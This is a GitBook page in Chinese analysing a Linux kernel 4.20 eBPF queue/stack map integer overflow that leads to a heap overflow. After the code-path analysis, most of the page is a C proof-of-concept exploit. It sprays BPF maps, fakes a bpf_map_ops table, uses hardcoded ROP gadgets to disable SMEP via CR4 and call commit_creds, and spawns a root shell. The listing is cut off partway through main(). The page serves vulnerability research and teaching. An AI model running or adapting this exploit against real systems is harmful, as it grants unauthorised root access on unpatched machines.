
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>kernel4.20_BPF_LPE · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="./">
            
                <a href="./">
            
                    
                    前言
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="快速搭建一个Linux内核调试环境.html">
            
                <a href="快速搭建一个Linux内核调试环境.html">
            
                    
                    快速搭建一个Linux内核调试环境
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4" >
            
                <span>
            
                    
                    [2020年]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="CVE-2020-8835-ebpf.html">
            
                <a href="CVE-2020-8835-ebpf.html">
            
                    
                    CVE-2020-8835 ebpf
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" >
            
                <span>
            
                    
                    [2019年]
            
                </span>
            

            
        </li>
    
        <li class="chapter " data-level="1.6" >
            
                <span>
            
                    
                    [2018年]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="1.6.1" data-path="kernel4.20_BPF_LPE.html">
            
                <a href="kernel4.20_BPF_LPE.html">
            
                    
                    kernel4.20_BPF_LPE
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" >
            
                <span>
            
                    
                    [2017年]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1" data-path="CVE-2017-16995-ebpf.html">
            
                <a href="CVE-2017-16995-ebpf.html">
            
                    
                    CVE-2017-16995 ebpf
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.2" data-path="CVE-2017-5123-waitid.html">
            
                <a href="CVE-2017-5123-waitid.html">
            
                    
                    CVE-2017-5123 waitid
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3" data-path="CVE-2017-1000112-UFO.html">
            
                <a href="CVE-2017-1000112-UFO.html">
            
                    
                    CVE-2017-1000112 UFO
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.4" data-path="CVE-2017-1000405-Huge_Dirtycow.html">
            
                <a href="CVE-2017-1000405-Huge_Dirtycow.html">
            
                    
                    CVE-2017-1000405 Huge Dirtycow
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.5" data-path="CVE-2017-7184-xfrm_user.html">
            
                <a href="CVE-2017-7184-xfrm_user.html">
            
                    
                    CVE-2017-7184 xfrm_user
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.8" >
            
                <span>
            
                    
                    [2016年]
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="CVE-2016-5195-Dirtycow.html">
            
                <a href="CVE-2016-5195-Dirtycow.html">
            
                    
                    CVE-2016-5195 Dirtycow
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >kernel4.20_BPF_LPE</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h3 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;">&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h3>
<p>&#x6D89;&#x53CA;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF1A;</p>
<pre><code class="lang-c">+<span class="hljs-keyword">struct</span> bpf_queue_stack {
+    <span class="hljs-keyword">struct</span> bpf_map <span class="hljs-built_in">map</span>;
+    <span class="hljs-keyword">raw_spinlock_t</span> lock;
+    u32 head, tail;
+    u32 size; <span class="hljs-comment">/* max_entries + 1 */</span>
+
+    <span class="hljs-keyword">char</span> elements[<span class="hljs-number">0</span>] __aligned(<span class="hljs-number">8</span>);
+};
<span class="hljs-keyword">struct</span> bpf_map {
    <span class="hljs-comment">/* The first two cachelines with read-mostly members of which some
     * are also accessed in fast-path (e.g. ops, max_entries).
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> bpf_map_ops *ops ____cacheline_aligned;
    <span class="hljs-keyword">struct</span> bpf_map *inner_map_meta;
<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_SECURITY</span>
    <span class="hljs-keyword">void</span> *security;
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
    <span class="hljs-keyword">enum</span> bpf_map_type map_type;
    u32 key_size;
    u32 value_size;
    u32 max_entries;
    u32 map_flags;
    u32 pages;
    u32 id;
    <span class="hljs-keyword">int</span> numa_node;
    u32 btf_key_type_id;
    u32 btf_value_type_id;
    <span class="hljs-keyword">struct</span> btf *btf;
    <span class="hljs-keyword">bool</span> unpriv_array;
    <span class="hljs-comment">/* 55 bytes hole */</span>

    <span class="hljs-comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing
     * particularly with refcounting.
     */</span>
    <span class="hljs-keyword">struct</span> user_struct *user ____cacheline_aligned;
    <span class="hljs-keyword">atomic_t</span> refcnt;
    <span class="hljs-keyword">atomic_t</span> usercnt;
    <span class="hljs-keyword">struct</span> work_struct work;
    <span class="hljs-keyword">char</span> name[BPF_OBJ_NAME_LEN];
};
<span class="hljs-comment">/* map is generic key/value storage optionally accesible by eBPF programs */</span>
<span class="hljs-keyword">struct</span> bpf_map_ops {
    <span class="hljs-comment">/* funcs callable from userspace (via syscall) */</span>
    <span class="hljs-keyword">int</span> (*map_alloc_check)(<span class="hljs-keyword">union</span> bpf_attr *attr);
    <span class="hljs-keyword">struct</span> bpf_map *(*map_alloc)(<span class="hljs-keyword">union</span> bpf_attr *attr);
    <span class="hljs-keyword">void</span> (*map_release)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> file *map_file);
    <span class="hljs-keyword">void</span> (*map_free)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>);
    <span class="hljs-keyword">int</span> (*map_get_next_key)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">void</span> *key, <span class="hljs-keyword">void</span> *next_key);
    <span class="hljs-keyword">void</span> (*map_release_uref)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>);

    <span class="hljs-comment">/* funcs callable from userspace and from eBPF programs */</span>
    <span class="hljs-keyword">void</span> *(*map_lookup_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">void</span> *key);
    <span class="hljs-keyword">int</span> (*map_update_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">void</span> *key, <span class="hljs-keyword">void</span> *value, u64 flags);
    <span class="hljs-keyword">int</span> (*map_delete_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">void</span> *key);
    <span class="hljs-keyword">int</span> (*map_push_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">void</span> *value, u64 flags);
    <span class="hljs-keyword">int</span> (*map_pop_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">void</span> *value);
    <span class="hljs-keyword">int</span> (*map_peek_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">void</span> *value);

    <span class="hljs-comment">/* funcs called by prog_array and perf_event_array map */</span>
    <span class="hljs-keyword">void</span> *(*map_fd_get_ptr)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> file *map_file,
                <span class="hljs-keyword">int</span> fd);
    <span class="hljs-keyword">void</span> (*map_fd_put_ptr)(<span class="hljs-keyword">void</span> *ptr);
    u32 (*map_gen_lookup)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> bpf_insn *insn_buf);
    u32 (*map_fd_sys_lookup_elem)(<span class="hljs-keyword">void</span> *ptr);
    <span class="hljs-keyword">void</span> (*map_seq_show_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">void</span> *key,
                  <span class="hljs-keyword">struct</span> seq_file *m);
    <span class="hljs-keyword">int</span> (*map_check_btf)(<span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>,
                 <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> btf_type *key_type,
                 <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> btf_type *value_type);
};
</code></pre>
<pre><code class="lang-c">   <span class="hljs-number">290</span> <span class="hljs-keyword">union</span> bpf_attr {                                         
   <span class="hljs-number">291</span>     <span class="hljs-keyword">struct</span> { <span class="hljs-comment">/* anonymous struct used by BPF_MAP_CREATE command */</span>     
   <span class="hljs-number">292</span>         __u32   map_type;   <span class="hljs-comment">/* one of enum bpf_map_type */</span>        
   <span class="hljs-number">293</span>         __u32   key_size;   <span class="hljs-comment">/* size of key in bytes */</span>     
   <span class="hljs-number">294</span>         __u32   value_size; <span class="hljs-comment">/* size of value in bytes */</span>        
   <span class="hljs-number">295</span>         __u32   max_entries;    <span class="hljs-comment">/* max number of entries in a map */</span>    
   <span class="hljs-number">296</span>         __u32   map_flags;  <span class="hljs-comment">/* BPF_MAP_CREATE related                          
   297                      * flags defined above.   
               &#x2026;&#x2026;
</span></code></pre>
<p>&#x6F0F;&#x6D1E;&#x8C03;&#x7528;&#x94FE;&#xFF0C;&#x5206;&#x914D;qs&#x5806;&#x5757;&#xFF1A;</p>
<pre><code class="lang-c">__x64_sys_bpf() 
  -&gt;map_create()
    -&gt;find_and_alloc_map()
      -&gt;queue_stack_map_alloc()
</code></pre>
<pre><code class="lang-c">+static struct bpf_map *queue_stack_map_alloc(union bpf_attr *attr)
+{
+    int ret, numa_node = bpf_map_attr_numa_node(attr);
+    struct bpf_queue_stack *qs;
+    u32 size, value_size;
+    u64 queue_size, cost;
+
+    size = attr-&gt;max_entries + 1;//&#x5982;&#x679C;max_entries&#x4E3A;0xffffffff&#xFF0C;&#x5C31;&#x4F1A;&#x9020;&#x6210;&#x6EA2;&#x51FA;
+    value_size = attr-&gt;value_size;
+
+    queue_size = sizeof(*qs) + (u64) value_size * size;
+
+    cost = queue_size;
+    if (cost &gt;= U32_MAX - PAGE_SIZE)
+        return ERR_PTR(-E2BIG);
+
+    cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;
+
+    ret = bpf_map_precharge_memlock(cost);
+    if (ret &lt; 0)
+        return ERR_PTR(ret);
+
+    qs = bpf_map_area_alloc(queue_size, numa_node);//&#x9020;&#x6210;qs&#x5206;&#x914D;&#x7684;&#x7A7A;&#x95F4;&#x5F88;&#x5C0F;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;elements&#x8FDB;&#x884C;&#x6EA2;&#x51FA;&#xFF0C;&#x8D8A;&#x754C;&#x5199;
+    if (!qs)
+        return ERR_PTR(-ENOMEM);
+
+    memset(qs, 0, sizeof(*qs));
+
+    bpf_map_init_from_attr(&amp;qs-&gt;map, attr);
+
+    qs-&gt;map.pages = cost;
+    qs-&gt;size = size;
+
+    raw_spin_lock_init(&amp;qs-&gt;lock);
+
+    return &amp;qs-&gt;map;
+}
</code></pre>
<p>&#x4E4B;&#x540E;&#x5229;&#x7528;update&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#xFF0C;&#x5BF9;qs&#x5806;&#x5757;&#x8FDB;&#x884C;&#x8D8A;&#x754C;&#x5199;&#xFF1A;</p>
<pre><code class="lang-c">__x64_sys_bpf()
  -&gt;map_update_elem()
    -&gt;queue_stack_map_push_elem()<span class="hljs-comment">//&#x5806;&#x6EA2;&#x51FA;</span>
</code></pre>
<pre><code class="lang-c">+static int queue_stack_map_push_elem(struct bpf_map *map, void *value,
+                     u64 flags)
+{
+    struct bpf_queue_stack *qs = bpf_queue_stack(map);
+    unsigned long irq_flags;
+    int err = 0;
+    void *dst;
+
+    /* BPF_EXIST is used to force making room for a new element in case the
+     * map is full
+     */
+    bool replace = (flags &amp; BPF_EXIST);
+
+    /* Check supported flags for queue and stack maps */
+    if (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)
+        return -EINVAL;
+
+    raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);
+
+    if (queue_stack_map_is_full(qs)) {
+        if (!replace) {
+            err = -E2BIG;
+            goto out;
+        }
+        /* advance tail pointer to overwrite oldest element */
+        if (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))
+            qs-&gt;tail = 0;
+    }
+
+    dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;map.value_size];
+    memcpy(dst, value, qs-&gt;map.value_size);//value&#x4E3A;&#x7528;&#x6237;&#x53EF;&#x63A7;&#x7684;&#x6570;&#x636E;&#xFF0C;dst&#x4E3A;elements&#x6570;&#x7EC4;
+
+    if (unlikely(++qs-&gt;head &gt;= qs-&gt;size))
+        qs-&gt;head = 0;
+
+out:
+    raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);
+    return err;
+}
</code></pre>
<p>&#x5982;&#x679C;&#x4F20;&#x5165;max_entries&#x4E3A;0xffffffff&#xFF0C;&#x6B64;&#x65F6;size&#x4E3A;0&#xFF0C;&#x6700;&#x540E;&#x7533;&#x8BF7;&#x7684;qs&#x7684;&#x5927;&#x5C0F;&#x4E3A;sizeof(*qs)&#xFF0C;&#x4F1A;&#x901A;&#x8FC7;kmalloc-256&#x7533;&#x8BF7;&#x4E00;&#x4E2A;0x100&#x7684;&#x5806;&#x5757;&#xFF0C;&#x524D;0xd0&#x5B58;&#x653E;bpf_queue_stack&#x524D;&#x534A;&#x90E8;&#x5206;&#x7ED3;&#x6784;&#xFF0C;&#x5269;&#x4F59;0x30&#x5B58;&#x653E;elements&#x6570;&#x7EC4;&#xFF08;elements&#x5B57;&#x6BB5;&#x5728;&#x7ED3;&#x6784;&#x4F53;&#x4E2D;&#x504F;&#x79FB;&#x4E3A;0xd0&#xFF09;&#xFF0C;&#x6240;&#x4EE5;elements[6]&#xFF0C;&#x5373;&#x4E3A;&#x4E0B;&#x4E00;&#x4E2A;bpf_queue_stack&#x7ED3;&#x6784;&#x7684;&#x8D77;&#x59CB;&#x5730;&#x5740;&#x3002;</p>
<p>elements[6]&#x53EF;&#x8986;&#x76D6;&#x4E0B;&#x4E00;&#x4E2A;bpf_queue_stack&#x7ED3;&#x6784;&#x7684;bpf_map-&gt;bpf_map_ops&#xFF0C;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;bpf_map_ops&#x865A;&#x51FD;&#x6570;&#x8868;&#x3002;</p>
<p>&#x8986;&#x76D6;void (<em>map_release)(struct bpf_map </em>map, struct file *map_file);&#x4E3A;rop&#x94FE;&#xFF0C;&#x9996;&#x5148;&#x8FDB;&#x884C;&#x6808;&#x5207;&#x6362;&#xFF0C;&#x5C06;&#x6808;&#x5207;&#x5230;&#x7528;&#x6237;&#x6001;&#xFF0C;&#x5E76;&#x5728;&#x4F2A;&#x9020;&#x7684;&#x6808;&#x4E0A;&#x5E03;&#x7F6E;rop&#x94FE;&#x8FDB;&#x884C;&#x63D0;&#x6743;&#xFF0C;&#x8FD9;&#x79CD;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#x9700;&#x8981;&#x5173;&#x95ED;smap&#xFF0C;&#x540C;&#x65F6;&#x7531;&#x4E8E;&#x6CA1;&#x6709;&#x6CC4;&#x9732;&#x4FE1;&#x606F;&#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x7ED5;&#x8FC7;kaslr&#x3002;</p>
<h3 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;">&#x6F0F;&#x6D1E;&#x5229;&#x7528;</h3>
<pre><code class="lang-c"><span class="hljs-comment">/*************************************************************
 * File Name: poc.c
 * 
 * Created on: 2020-05-26 07:56:22
 * Author: De4dCr0w
 * 
 * Last Modified: 2020-05-28 05:12:50
 * Description: 
************************************************************/</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;endian.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BPF_OBJ_NAME_LEN 16U</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __u32 uint32_t </span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __aligned_u64 uint64_t</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __u64 uint64_t</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_bpf 321</span>

<span class="hljs-keyword">union</span> bpf_attr {
    <span class="hljs-keyword">struct</span> { <span class="hljs-comment">/* anonymous struct used by BPF_MAP_CREATE command */</span>                                
        __u32   map_type;   <span class="hljs-comment">/* one of enum bpf_map_type */</span>                                        
        __u32   key_size;   <span class="hljs-comment">/* size of key in bytes */</span>
        __u32   value_size; <span class="hljs-comment">/* size of value in bytes */</span>
        __u32   max_entries;    <span class="hljs-comment">/* max number of entries in a map */</span>                              
        __u32   map_flags;  <span class="hljs-comment">/* BPF_MAP_CREATE related                                             
                     * flags defined above.                                                       
                     */</span>
        __u32   inner_map_fd;   <span class="hljs-comment">/* fd pointing to the inner map */</span>                                
        __u32   numa_node;  <span class="hljs-comment">/* numa node (effective only if                                       
                     * BPF_F_NUMA_NODE is set).                                                   
                     */</span>
        <span class="hljs-keyword">char</span>    map_name[BPF_OBJ_NAME_LEN];
        __u32   map_ifindex;    <span class="hljs-comment">/* ifindex of netdev to create on */</span>                              
        __u32   btf_fd;     <span class="hljs-comment">/* fd pointing to a BTF type data */</span>                                  
        __u32   btf_key_type_id;    <span class="hljs-comment">/* BTF type_id of the key */</span>
        __u32   btf_value_type_id;  <span class="hljs-comment">/* BTF type_id of the value */</span>                                
    }; 
    <span class="hljs-keyword">struct</span> { <span class="hljs-comment">/* anonymous struct used by BPF_MAP_*_ELEM commands */</span>                                          
        __u32       map_fd;
        __aligned_u64   key;                                                                                 
        <span class="hljs-keyword">union</span> {
            __aligned_u64 value;
            __aligned_u64 next_key;                                                                          
        };
        __u64       flags;                                                                                   
    };                     
};

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span>
<span class="hljs-keyword">void</span>* (*prepare_kernel_cred)(<span class="hljs-keyword">void</span>*) KERNCALL = (<span class="hljs-keyword">void</span>*) <span class="hljs-number">0xFFFFFFFF810E3D40</span>; <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span>change it</span>
<span class="hljs-keyword">void</span> (*commit_creds)(<span class="hljs-keyword">void</span>*) KERNCALL = (<span class="hljs-keyword">void</span>*) <span class="hljs-number">0xFFFFFFFF810E3AB0</span>; <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span>change it</span>
<span class="hljs-keyword">uint64_t</span> pop_rax_ret = <span class="hljs-number">0xffffffff81029c71</span>; <span class="hljs-comment">// pop rax ; ret ;</span>
<span class="hljs-keyword">uint64_t</span> native_write_cr4 = <span class="hljs-number">0xffffffff810037d5</span>; <span class="hljs-comment">// mov cr4, rax; push rcx; popfq; ret;</span>
<span class="hljs-keyword">uint64_t</span> pop_rdi_ret = <span class="hljs-number">0xffffffff810013b9</span>; <span class="hljs-comment">// pop rdi ; ret ;</span>
<span class="hljs-keyword">uint64_t</span> pop_rsi_ret = <span class="hljs-number">0xffffffff81001c50</span>; <span class="hljs-comment">// pop rdi ; ret ;</span>
<span class="hljs-keyword">uint64_t</span> push_rax_push_rsi = <span class="hljs-number">0xffffffff81264e0b</span>; <span class="hljs-comment">// push rax; push rsi; ret;</span>
<span class="hljs-keyword">uint64_t</span> swapgs_ret = <span class="hljs-number">0xffffffff81c00d5a</span>; <span class="hljs-comment">// swapgs; popfq; retq;</span>
<span class="hljs-keyword">uint64_t</span> iretq = <span class="hljs-number">0xffffffff8106d8f4</span>; <span class="hljs-comment">// iretq; cli;</span>

<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> user_cs, user_ss, user_rflags, user_sp;

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_stat</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">asm</span>(
        <span class="hljs-string">&quot;movq %%cs, %0;&quot;</span>
        <span class="hljs-string">&quot;movq %%ss, %1;&quot;</span>
        <span class="hljs-string">&quot;movq %%rsp, %2;&quot;</span>
        <span class="hljs-string">&quot;pushfq;&quot;</span>
        <span class="hljs-string">&quot;popq %3;&quot;</span>
        : <span class="hljs-string">&quot;=r&quot;</span> (user_cs), <span class="hljs-string">&quot;=r&quot;</span> (user_ss), <span class="hljs-string">&quot;=r&quot;</span> (user_sp), <span class="hljs-string">&quot;=r&quot;</span> (user_rflags) : : <span class="hljs-string">&quot;memory&quot;</span>);
}


<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shell</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">if</span>(!getuid())
    {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] you got root!\n&quot;</span>);
        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[T.T] privilege escalation failed !!!\n&quot;</span>);
    }
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);

}

<span class="hljs-keyword">uint64_t</span> victim[<span class="hljs-number">16</span>];
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spray</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span>
</span>{
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++){
        victim[i] = syscall(__NR_bpf, <span class="hljs-number">0</span>, attr, <span class="hljs-number">0x2c</span>);
    }
    <span class="hljs-keyword">return</span>;

}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">close_map_fd</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++){
        close(victim[i]);
    }
    <span class="hljs-keyword">return</span>;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">malloc_map</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *user_attr)</span></span>{
    <span class="hljs-built_in">memset</span>(user_attr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">union</span> bpf_attr));
    user_attr-&gt;map_type = <span class="hljs-number">0x17</span>; <span class="hljs-comment">//BPF_MAP_TYPE_STACK</span>
    user_attr-&gt;key_size = <span class="hljs-number">0</span>;
    user_attr-&gt;value_size = <span class="hljs-number">0x40</span>;
    user_attr-&gt;max_entries = <span class="hljs-number">-1</span>;
    user_attr-&gt;map_flags = <span class="hljs-number">0</span>;
    user_attr-&gt;inner_map_fd = <span class="hljs-number">-1</span>;
    user_attr-&gt;numa_node = <span class="hljs-number">0</span>;

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] user_attr : %p\n&quot;</span>, user_attr);
    <span class="hljs-keyword">int</span> res = syscall(__NR_bpf, <span class="hljs-number">0</span>, user_attr, <span class="hljs-number">0x2c</span>);
    <span class="hljs-keyword">if</span>(res == <span class="hljs-number">-1</span>){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;__NR_bpf 0 error!\n&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
    }
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;res : %d\n&quot;</span>, res);
    <span class="hljs-keyword">return</span> res;

}
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">update_map</span><span class="hljs-params">(<span class="hljs-keyword">int</span> res, <span class="hljs-keyword">union</span> bpf_attr *user_attr, uint64_t fake_elements)</span></span>{
    user_attr-&gt;map_fd = res;
    user_attr-&gt;key = <span class="hljs-number">0</span>;
    user_attr-&gt;value = (<span class="hljs-keyword">uint64_t</span>)fake_elements;
    user_attr-&gt;flags = <span class="hljs-number">2</span>;
    res = syscall(__NR_bpf, <span class="hljs-number">2</span>, user_attr, <span class="hljs-number">0x2c</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_shell_again</span><span class="hljs-params">()</span></span>{
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;SIGSEGV found&quot;</span>);
  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;get shell again&quot;</span>);
  system(<span class="hljs-string">&quot;id&quot;</span>);
  <span class="hljs-keyword">char</span> *shell = <span class="hljs-string">&quot;/bin/sh&quot;</span>;
  <span class="hljs-keyword">char</span> *args[] = {shell, <span class="hljs-literal">NULL</span>};
  execve(shell, args, <span class="hljs-literal">NULL</span>);
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    signal(SIGSEGV, get_shell_again);
    save_stat();

    <span class="hljs-keyword">union</span> bpf_attr *user_attr = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">union</span> bpf_attr));
    <span class="hljs-keyword">int</span> res = malloc_map(user_attr);

    spray(user_attr);

    <span class="hljs-keyword">uint64_t</span> *fake_ops = mmap((<span class="hljs-keyword">void</span> *)<span class="hljs-number">0xa000000000</span>,<span class="hljs-number">0x8000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);
    <span class="hljs-keyword">void</span> *rop_base = mmap((<span class="hljs-keyword">void</span> *)<span class="hljs-number">0x81012000</span>,<span class="hljs-number">0x8000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);
